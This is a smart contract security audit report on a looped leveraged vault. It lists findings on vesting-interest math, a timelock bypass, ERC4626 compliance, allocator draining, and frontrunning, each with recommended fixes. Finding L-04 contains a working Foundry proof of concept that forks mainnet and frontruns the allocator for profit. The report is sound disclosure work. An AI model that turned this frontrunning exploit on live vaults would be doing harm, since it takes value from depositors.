# About
 Pashov Audit Group consists of multiple teams of some of the best smart contract security researchers in the space. Having a combined reported security vulnerabilities count of over 1000, the group strives to create the absolute very best audit journey possible - although 100% security can never be guaranteed, we do guarantee the best efforts of our experienced researchers for your blockchain protocol. Check our previous work [here](https://github.com/pashov/audits) or reach out on Twitter [@pashovkrum](https://twitter.com/pashovkrum).
# Disclaimer
 A smart contract security review can never verify the complete absence of vulnerabilities. This is a time, resource and expertise bound effort where we try to find as many vulnerabilities as possible. We can not guarantee 100% security after the review or even if the review will find any problems with your smart contracts. Subsequent security reviews, bug bounty programs and on-chain monitoring are strongly recommended.
# Introduction
 A time-boxed security review of the **spacegliderrrr/loopedVault** repository was done by **Pashov Audit Group**, with a focus on the security aspects of the application's smart contracts implementation.
# About Loop Vaults
 
Looped is a vault system where user deposits are managed by an off-chain allocator to perform leveraged looping strategies using Morpho and Pendle PTs. By repeatedly borrowing and swapping to increase exposure, users aim to earn fixed interest above borrowing costs.

# Risk Classification
 
| Severity               | Impact: High | Impact: Medium | Impact: Low |
| ---------------------- | ------------ | -------------- | ----------- |
| **Likelihood: High**   | Critical     | High           | Medium      |
| **Likelihood: Medium** | High         | Medium         | Low         |
| **Likelihood: Low**    | Medium       | Low            | Low         |

## Impact
 
- High - leads to a significant material loss of assets in the protocol or significantly harms a group of users.

- Medium - leads to a moderate material loss of assets in the protocol or moderately harms a group of users.

- Low - leads to a minor material loss of assets in the protocol or harms a small group of users.

## Likelihood
 
- High - attack path is possible with reasonable assumptions that mimic on-chain conditions, and the cost of the attack is relatively low compared to the amount of funds that can be stolen or lost.

- Medium - only a conditionally incentivized attack vector, but still relatively likely.

- Low - has too many or too unlikely assumptions or requires a significant stake by the attacker with little or no incentive.

## Action required for severity levels
 
- Critical - Must fix as soon as possible (if already deployed)

- High - Must fix (before deployment if not already deployed)

- Medium - Should fix

- Low - Could fix

# Security Assessment Summary
 _review commit hash_ - [08253ac43834c95019ce0ad884d3eb50d8351d6a](https://github.com/spacegliderrrr/loopedVault/tree/08253ac43834c95019ce0ad884d3eb50d8351d6a)

_fixes review commit hash_ - [5818614c023a8eb339c2cc44c707de5edef3f6fb](https://github.com/spacegliderrrr/loopedVault/tree/5818614c023a8eb339c2cc44c707de5edef3f6fb)

### Scope

The following smart contracts were in scope of the audit:

- `LoopedVaults` 

# Findings
 # [H-01] Incorrect vesting interest calculation enables MEV attacks

## Severity

**Impact:** Medium

**Likelihood:** High

## Description

Given that the value of the positions is updated only when `updateInterval` time has passed, the interest is vested to prevent MEV attacks.

However, the implementation of `_vestingInterest()` is incorrect, as it returns 0 when `block.timestamp == lastUpdate` and increases linearly until `vestingDuration` is reached. This means that calling `totalAssets()` just after an update will include all the interest accrued, which makes the update subject to MEV attacks.

```solidity
    function totalAssets() public view override returns (uint256) {
        return lastTotalAssets - _vestingInterest();
    }

    function _vestingInterest() internal view returns (uint256) {
        if (block.timestamp - lastUpdate >= vestingDuration) return 0;

        uint256 __vestingInterest = (block.timestamp - lastUpdate) * vestingInterest / vestingDuration;
        return __vestingInterest;
    }
```

## Recommendations

```diff
-       uint256 __vestingInterest = (block.timestamp - lastUpdate) * vestingInterest / vestingDuration;
+	uint256 __vestingInterest = (vestingDuration - (block.timestamp - lastUpdate)) * vestingInterest / vestingDuration;
```



# [L-01] Timelock can be bypassed even when enabled

Supposing that timelocks are enabled some time after the deploy, the timelock can still be skipped, as `addMarket` doesn't check if `scheduleAdd` is initialized. 

As such, new markets can be added without calling `scheduleAddMarket` and waiting for the timelock.

Consider checking that `scheduledAdd[id] != 0`.



# [L-02] Protocols fail to integrate with vault, causing fund loss

The `_deposit` and `_withdraw` functions are limited by `depositCap` and `idleBalance` respectively, but these limitations are not implemented in the ERC4626 functions `maxDeposit` and `maxWithdraw`.

This could cause integration compatibility issues with other protocols that expect a compliant vault, particularly if they rely on `maxDeposit` and `maxWithdraw` to determine the permissible deposit/withdrawal amounts.

Impact: Indirect loss of protocol fees if other protocols cannot integrate with the contract, or locked funds in some edge cases.

Likelihood: While using a wrapper could avoid this issue, it might be impossible with some protocols that expect a compliant vault.

Recommendations:

Consider overriding `maxDeposit` and `maxWithdraw` to enforce the same limits used in `_deposit` and `_withdraw`, ensuring the contract properly reports the depositable/withdrawable amounts.



# [L-03] Compromised allocator may drain vault via position cycling

A compromised allocator can drain vault funds by repeatedly opening and closing positions to extract value through legitimate slippage allowances. With configurable slippage protection (`positionMaxSlippage`, default 1%), an allocator can execute cycles where:

1. Opening position: lose X% on borrowed token to collateral swaps.
2. Closing position: lose Y% on collateral to borrowed token swaps, plus additional slippage if borrowed asset differs from vault asset.

Combined cycle loss approximates 2X-3X the allowed slippage percentage. With 15 enabled markets and no rate limiting, multiple rapid cycles could drain significant vault value.

Recommendations:

Implement rate limiting on position operations (e.g., minimum time between open/close cycles per market).



# [L-04] Operations that modify the exchange rate can be frontrun

`onMorphoSupplyCollateral()` and `onMorphoRepay()` update the `lastTotalAssets` variable with the net profit or loss resulting from the operation. This will instantly modify the exchange rate for shares to assets, which opens the door for frontrunning attacks.

In the case of an increase in the value of the assets, an attacker can make a deposit just before the allocator's call and redeem the shares just after, profiting from the difference in the exchange rate.

In the case of a decrease in the value of the assets, shareholders can redeem their shares just before the allocator's call to avoid incurring losses, increasing the losses for the rest of the shareholders.

**Proof of concept**

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/LoopedVaults.sol";
import "./utils/MockPricefeed.sol";

contract AuditTest is Test {
    using MarketParamsLib for MarketParams;

    address morpho = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
    address pendlerouter = 0x888888888889758F76e7103c6CbF23ABbF58F946;
    address usdc = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
    address pricefeed;

    LoopedVault vault;
    address feeRecipient = makeAddr("FeeRecipient");
    address allocator = makeAddr("Allocator");
    address alice = makeAddr("Alice");
    address bob = makeAddr("Bob");
    address ptUsr = 0xa6F0A4D18B6f6DdD408936e81b7b3A8BEFA18e77;

    MarketParams mp;

    function setUp() public {
        vm.createSelectFork("https://mainnet.base.org");

        pricefeed = address(new MockPricefeed());
        MockPricefeed(pricefeed).setPrice(usdc, 1e18);
        MockPricefeed(pricefeed).setPrice(ptUsr, 1e18);

        vault = new LoopedVault(usdc, pendlerouter, morpho, feeRecipient, allocator, pricefeed);

        mp.collateralToken = ptUsr;
        mp.loanToken = usdc;
        mp.oracle = 0x6AdeD60f115bD6244ff4be46f84149bA758D9085;
        mp.irm = 0x46415998764C29aB2a25CbeA6254146D50D22687;
        mp.lltv = 915000000000000000;

        vault.scheduleAddMarket(mp.id());
        vault.addMarket(mp);

        deal(usdc, alice, 10_000e6);
        deal(usdc, bob, 10_000e6);

        vm.prank(alice);
        IERC20(usdc).approve(address(vault), type(uint256).max);
        vm.prank(bob);
        IERC20(usdc).approve(address(vault), type(uint256).max);
    }

    function test_frontRunAllocator() public {
        vm.prank(alice);
        vault.deposit(100e6, alice);
        
        skip(7 days);

        MorphoLoop memory ml;
        ml.marketParams = mp;
        ml.amountToSupply = 5e18;
        ml.amountToBorrow = 4e6;

        SwapData memory swapData;
        swapData.swapType = SwapType(1);
        swapData.extRouter = 0x6131B5fae19EA4f9D964eAc0408E4408b66337b5;
        swapData.extCalldata = hex"e21fd0e90000000000000000000000000000000000000000000000000000000000000020000000000000000000000000c7d3ab410d49b664d03fe5b1038852ac852b1b29000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000001c0000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000000e801010000003d02000000ebbe893eab7c830de0e04cb54a974ea279b9d37a000000000000000000000000004c4b4001fff6fbe64b68d618d47c209fe40b0d8ee6e23c900a833589fcd6edb6e08f4c7c32d4f71b54bda0291335e5db674d8e93a03d814fa0ada70731efe8a4b9888888888889758f76e7103c6cbf23abbf58f9460000000000000000000000007fffffff00000054000000000000000000000000000000000000000000000000000000000000000000000000000000000000048c75d8895400000000000000004568412f557adc1e4f82e73edb06d29ff62c91ec8f5ff06571bdeb29000000000000000000000000000000000000000000000000000000000000000000000000833589fcd6edb6e08f4c7c32d4f71b54bda0291300000000000000000000000035e5db674d8e93a03d814fa0ada70731efe8a4b9000000000000000000000000000000000000000000000000000000000000016000000000000000000000000000000000000000000000000000000000000001a000000000000000000000000000000000000000000000000000000000000001e00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000888888888889758f76e7103c6cbf23abbf58f94600000000000000000000000000000000000000000000000000000000004c4b4000000000000000000000000000000000000000000000000041efd7869134b782000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002200000000000000000000000000000000000000000000000000000000000000001000000000000000000000000c7d3ab410d49b664d03fe5b1038852ac852b1b29000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000004c4b4000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002607b22536f75726365223a2250656e646c65222c22416d6f756e74496e555344223a22342e39383936303630323834363839383635222c22416d6f756e744f7574555344223a22342e393839363937373936353138343436222c22526566657272616c223a22222c22466c616773223a302c22416d6f756e744f7574223a2235303031333139303537373438333139323632222c2254696d657374616d70223a313734353931373733342c22526f7574654944223a2235636136633763642d616261302d343630322d626131322d653130623239313939396431222c22496e74656772697479496e666f223a7b224b65794944223a2231222c225369676e6174757265223a224172574f7263504839787541726d6d6a6c593475596574516a4b362b715066656f687a396f55594f376f596439766974684c7467726f346b674b744c4732464735735465414c624b703070494c686d68362f587276594b4a303550692f597650683535305759715a6330703736646b317242593947367a5861322b36753356456f2f53306c6657467950564d784b4c6b657258466b787448372b463938464b59766c356c692f307a2f457345424c30615556556c4c3532464d5a6b4e7142516c4c57704f4c415055584944556d6d5049556d68393436556a6a75704e2f4355474a45415644783242446b68712b49545a6a35553061425a4571462b2f4c534b724b38644b2f6a4c36464e34343946666938367059706753596e355257424938534c65596e4b306c48616f6d75646e66372f7a544164754f442f464e453754654a2b544250434f6d37567159792b7449506553435147413d3d227d7d";

        TokenInput memory input;
        input.tokenIn = usdc;
        input.netTokenIn = 5e6;
        input.tokenMintSy = 0x35E5dB674D8e93a03d814FA0ADa70731efe8a4b9;
        input.pendleSwap = 0x313e7Ef7d52f5C10aC04ebaa4d33CDc68634c212;
        input.swapData = swapData;

        ml.input = input;
        ml.SY = 0x4665d514e82B2F9c78Fa2B984e450F33d9efc842;
        ml.pendleMarket = 0x715509Bde846104cF2cCeBF6fdF7eF1BB874Bc45;

        // Bob is checking the mempool and notices that a tx will increase the value of the shares,
        // so he front-runs it with a deposit
        vm.prank(bob);
        uint256 bobDepositAmount = 10_000e6;
        uint256 bobShares = vault.deposit(bobDepositAmount, bob);

        vm.prank(allocator);
        vault.loopToMorpho(ml);

        // Bob withdraws his shares making an instant profit, which would correpond to Alice if he
        // didn't front-run the allocator's tx
        vm.prank(bob);
        uint256 assetsReceived = vault.redeem(bobShares, bob, bob);
        assert(assetsReceived > bobDepositAmount);
    }
}
```

**Recommendations**

- Use a vesting mechanism for profits resulting from the allocator's operations.
- Add a cooldown period for withdrawals.


